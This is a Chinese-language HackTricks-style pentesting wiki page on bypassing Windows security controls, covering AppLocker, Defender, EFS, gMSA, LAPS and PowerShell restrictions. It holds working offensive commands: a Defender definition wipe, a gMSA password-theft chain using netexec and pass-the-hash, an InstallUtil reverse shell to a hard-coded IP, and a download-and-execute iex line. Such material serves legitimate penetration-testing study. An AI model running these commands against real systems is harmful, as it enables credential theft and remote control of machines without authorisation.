# Windows 安全控制

{{#include ../../banners/hacktricks-training.md}}

## AppLocker 策略

应用程序白名单是经批准、允许在系统上存在并运行的软件应用程序或可执行文件的列表。其目标是保护环境免受有害恶意软件和未经批准的软件影响，这些软件不符合组织的特定业务需求。

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) 是 Microsoft 的**应用程序白名单解决方案**，可让系统管理员控制**用户可以运行哪些应用程序和文件**。它能够对可执行文件、脚本、Windows 安装程序文件、DLL、打包应用和打包应用安装程序进行**精细控制**。\
组织通常会**阻止 cmd.exe 和 PowerShell.exe**，并限制对某些目录的写入权限，**但这些措施都可以被绕过**。

### 检查

检查哪些文件/扩展名被列入黑名单/白名单：

```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```

This registry path 包含 AppLocker 应用的配置和策略，可用于查看系统当前强制执行的规则集：

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- 可用于绕过 AppLocker Policy 的**可写文件夹**：如果 AppLocker 允许在 `C:\Windows\System32` 或 `C:\Windows` 中执行任何内容，就可以使用一些**可写文件夹**来**绕过它**。

```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```

- 通常**受信任**的 [**"LOLBAS's"**](https://lolbas-project.github.io/) 二进制文件也可用于绕过 AppLocker。
- **编写不当的规则也可能被绕过**
  - 例如，**`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**，你可以在任意位置创建一个名为 **`allowed` 的文件夹**，这样它就会被允许。
  - 组织通常也会专注于**阻止 `%System32%\WindowsPowerShell\v1.0\powershell.exe` 可执行文件**，却忘了**其他** [**PowerShell 可执行文件位置**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations)，例如 `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` 或 `PowerShell_ISE.exe`。
- **DLL enforcement 很少启用**，因为它会给系统带来额外负载，而且需要进行大量测试来确保不会导致任何问题。因此，将 **DLL 用作后门有助于绕过 AppLocker**。
- 你可以使用 [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 或 [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 在任何进程中**执行 Powershell** 代码并绕过 AppLocker。更多信息请参阅：[https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)。<sup>[[4]](#references)</sup>

## Credentials Storage

### Security Accounts Manager (SAM)

本地凭据存储在此文件中，密码以哈希形式保存。

### Local Security Authority (LSA) - LSASS

出于 Single Sign-On 的需要，此子系统会将**凭据**（哈希形式）**保存在**其**内存**中。\
**LSA** 管理本地**安全策略**（密码策略、用户权限等）、**身份验证**、**访问令牌**……\
对于提供的凭据，LSA 会负责在 **SAM** 文件中进行**检查**（用于本地登录），并与**域控制器**通信以验证域用户身份。

**凭据**保存在 **LSASS 进程**中：Kerberos 票据、NT 和 LM 哈希、可轻易解密的密码。

### LSA secrets

LSA 可能会将一些凭据保存在磁盘上：

- Active Directory 计算机帐户的密码（无法连接域控制器时）。
- Windows 服务帐户的密码
- 计划任务的密码
- 其他（IIS 应用程序的密码……）

### NTDS.dit

这是 Active Directory 的数据库，仅存在于域控制器上。

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) 是一款适用于 Windows 10、Windows 11 及部分 Windows Server 版本的 Antivirus。它会**阻止**常见的 pentesting 工具，例如 **`WinPEAS`**。不过，有一些方法可以**绕过这些保护**。

### Check

若要检查 **Defender** 的**状态**，可以执行 PS cmdlet **`Get-MpComputerStatus`**（检查 **`RealTimeProtectionEnabled`** 的值，判断其是否处于活动状态）：

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

你也可以运行以下命令进行枚举：

```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## 加密文件系统 (EFS)

EFS 通过加密保护文件，使用称为 **文件加密密钥 (FEK)** 的**对称密钥**。该密钥使用用户的**公钥**加密，并存储在加密文件的 $EFS **备用数据流**中。需要解密时，使用用户数字证书对应的**私钥**从 $EFS 数据流中解密 FEK。更多详情请参阅[此处](https://en.wikipedia.org/wiki/Encrypting_File_System)。

**无需用户主动操作即可解密**的情形包括：

- 将文件或文件夹移动到非 EFS 文件系统（例如 [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table)）时，它们会自动解密。
- 通过 SMB/CIFS 协议在网络上发送加密文件时，文件会在传输前解密。

这种加密方式让文件所有者可以**透明地访问**加密文件。但是，仅更改所有者的密码并登录，并不能解密文件。

**要点**：

- EFS 使用对称 FEK，并用用户的公钥加密。
- 解密时使用用户的私钥来访问 FEK。
- 在特定情况下会自动解密，例如复制到 FAT32 或通过网络传输。
- 所有者无需执行其他步骤即可访问加密文件。

### 检查 EFS 信息

检查**用户**是否**使用过**此**服务**，方法是查看此路径是否存在：`C:\users\<username>\appdata\roaming\Microsoft\Protect`

使用 cipher /c \<file>\ 检查谁有权访问该文件\
也可以在文件夹中使用 `cipher /e` 和 `cipher /d` 来**加密**和**解密**所有文件

### 解密 EFS 文件

#### 以 Authority System 身份运行

此方法要求**受害者用户**在主机中**运行**一个**进程**。如果满足此条件，可以使用 `meterpreter` 会话冒用该用户进程的令牌（通过 `incognito` 中的 `impersonate_token`）。或者也可以直接 `migrate` 到该用户的进程。

#### 知道用户密码

Mimikatz 文档说明了如何导入用户的证书/私钥材料，并在知道密码时解密受 EFS 保护的文件。<sup>[[6]](#references)</sup>

## 组托管服务帐户 (gMSA)

Microsoft 开发了**组托管服务帐户 (gMSA)**，以简化 IT 基础架构中服务帐户的管理。与通常启用“**密码永不过期**”设置的传统服务帐户不同，gMSA 提供了更安全、更易于管理的解决方案：

- **自动密码管理**：gMSA 使用复杂的 240 字符密码，并根据域或计算机策略自动更改。此过程由 Microsoft 的密钥分发服务 (KDC) 处理，无需手动更新密码。
- **增强安全性**：这些帐户不会被锁定，也不能用于交互式登录，从而增强了安全性。
- **支持多个主机**：gMSA 可以在多个主机之间共享，非常适合运行在多台服务器上的服务。
- **计划任务功能**：与托管服务帐户不同，gMSA 支持运行计划任务。
- **简化 SPN 管理**：当计算机的 sAMaccount 详情或 DNS 名称发生变化时，系统会自动更新服务主体名称 (SPN)，从而简化 SPN 管理。

gMSA 的密码存储在 LDAP 属性 _**msDS-ManagedPassword**_ 中，并由域控制器 (DC) 每 30 天自动重置一次。该密码是一个名为 [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) 的加密数据块，只能由授权管理员和安装了 gMSA 的服务器获取，从而确保环境安全。要访问此信息，必须使用 LDAPS 等安全连接，或通过“Sealing & Secure”进行身份验证。

![中继 NTLM 身份验证以获取 gMSA 密码](../../images/asd1.png)<sup>[[1]](#references)</sup>

你可以使用 [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:** 读取此密码。<sup>[[2]](#references)</sup>

```
/GMSAPasswordReader --AccountName jkohler
```

[**在归档的原始研究中了解更多信息**](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/)。<sup>[[1]](#references)</sup>

同一项研究说明，当被中继的主体获准读取 `msDS-ManagedPassword` 时，**NTLM relay attack** 可以获取 **gMSA password**。<sup>[[1]](#references)</sup>

### 滥用 ACL 链式授权来读取 gMSA 托管密码（GenericAll -> ReadGMSAPassword）

在许多环境中，低权限用户可以通过滥用配置错误的对象 ACL，在不攻陷 DC 的情况下获取 gMSA 密钥：<sup>[[3]](#references)</sup>

- 你可以控制的组（例如通过 GenericAll/GenericWrite）被授予对某个 gMSA 的 `ReadGMSAPassword` 权限。
- 将自己加入该组后，你便继承了通过 LDAP 读取 gMSA 的 `msDS-ManagedPassword` blob 并派生可用 NTLM 凭据的权限。

典型工作流程：

1) 使用 BloodHound 发现路径，并将你的立足点主体标记为 Owned。查找类似以下的边：
   - GroupA GenericAll -> GroupB；GroupB ReadGMSAPassword -> gMSA

2) 将自己加入你控制的中间组（使用 bloodyAD 的示例）：

```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```

3) 通过 LDAP 读取 gMSA 托管密码并推导 NTLM 哈希。NetExec 可自动提取 `msDS-ManagedPassword` 并将其转换为 NTLM：

```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```

4) 使用 NTLM hash 以 gMSA 身份进行身份验证（无需明文密码）。如果该账户属于 Remote Management Users，则 WinRM 可以直接使用：

```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```

备注：
- LDAP 读取 `msDS-ManagedPassword` 需要 sealing（例如 LDAPS/sign+seal）。工具会自动处理。
- gMSA 通常会被授予 WinRM 等本地权限；请验证组成员身份（例如 Remote Management Users），以规划横向移动。
- 如果只需要 blob 来自行计算 NTLM，请参阅 MSDS-MANAGEDPASSWORD_BLOB structure。

另一条 ACL 路径是在 gMSA 对象本身上获得写入权限。`msDS-GroupMSAMembership` 是用于确定哪些主体可以检索托管密码的安全描述符。其架构 GUID 为 `888eedd6-ce04-df40-b462-b8a50e41ba38`。如果你控制的组在该属性上拥有精确的 `WriteProperty` ACE，则可能可以通过它更改读取者列表；这与该组已经被列为读取者不同。在认定此路径可用之前，请确认完整的 DACL、拒绝和继承的 ACE，以及有效权限。新增组成员身份后，也需要刷新令牌/会话，才能尝试读取密码。<sup>[[7]](#references)</sup>



## LAPS

**本地管理员密码解决方案 (LAPS)** 可从 [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) 下载，用于管理本地 Administrator 密码。这些密码经过**随机化**、各不相同且会**定期更改**，并集中存储在 Active Directory 中。对这些密码的访问通过 ACL 限制为授权用户。获得足够的权限后，即可读取本地管理员密码。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**受限语言模式**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/)会**禁用许多有效使用 PowerShell 所需的功能**，例如阻止使用 COM 对象、仅允许使用经批准的 .NET 类型、基于 XAML 的工作流、PowerShell 类等。

### **检查**

```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```

### Bypass

```bash
#Easy bypass
Powershell -version 2
```

在当前版本的 Windows 上，该 bypass 已不再有效，但你可以使用 [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM)。\
**要编译它，你可能需要** **添加引用** -> _浏览_ ->_浏览_ -> 添加 `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll`，并**将项目改为 .Net4.5**。

#### Direct bypass:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```

#### Reverse shell:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```

你可以使用 [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 或 [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)，在任何进程中**执行 Powershell** 代码并绕过受限模式。更多信息请参阅：[https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)。<sup>[[4]](#references)</sup>

## PS 执行策略

默认设置为 **restricted**。绕过此策略的主要方法：

```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```

更多内容请参见 [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[5]](#references)</sup>

## 安全支持提供程序接口 (SSPI)

这是一个可用于对用户进行身份验证的 API。

SSPI 会为两台通信中的计算机选择合适的身份验证协议；若 Kerberos 可用，则优先使用 Kerberos。这些协议由安全支持提供程序 (SSP) 实现，它们以 DLL 的形式安装在 Windows 上；通信双方都必须支持协商选定的提供程序。

### 主要 SSP

- **Kerberos**：首选
  - %windir%\Windows\System32\kerberos.dll
- **NTLMv1** 和 **NTLMv2**：出于兼容性考虑
  - %windir%\Windows\System32\msv1_0.dll
- **Digest**：用于 Web 服务器和 LDAP，密码以 MD5 哈希形式提供
  - %windir%\Windows\System32\Wdigest.dll
- **Schannel**：用于 SSL 和 TLS
  - %windir%\Windows\System32\Schannel.dll
- **Negotiate**：用于协商所用协议（Kerberos 或 NTLM；默认使用 Kerberos）
  - %windir%\Windows\System32\lsasrv.dll

#### 协商可以提供多种方法，也可以只提供一种。

## UAC - 用户帐户控制

[用户帐户控制 (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) 是一项会在**执行需要提升权限的操作时显示确认提示**的功能。


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [1] [针对 gMSA 的 Relaying – cube0x0（Internet Archive）](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/)
- [2] [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [3] [HTB Sendai – 0xdf：通过权限链利用 gMSA 访问 WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [4] [darthsidious – 绕过 AppLocker 和 PowerShell Constrained Language Mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [5] [NetSPI – 绕过 PowerShell Execution Policy 的 15 种方法](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [6] [如何解密 EFS 文件](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [7] [Microsoft - ms-DS-GroupMSAMembership 属性](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
{{#include ../../banners/hacktricks-training.md}}
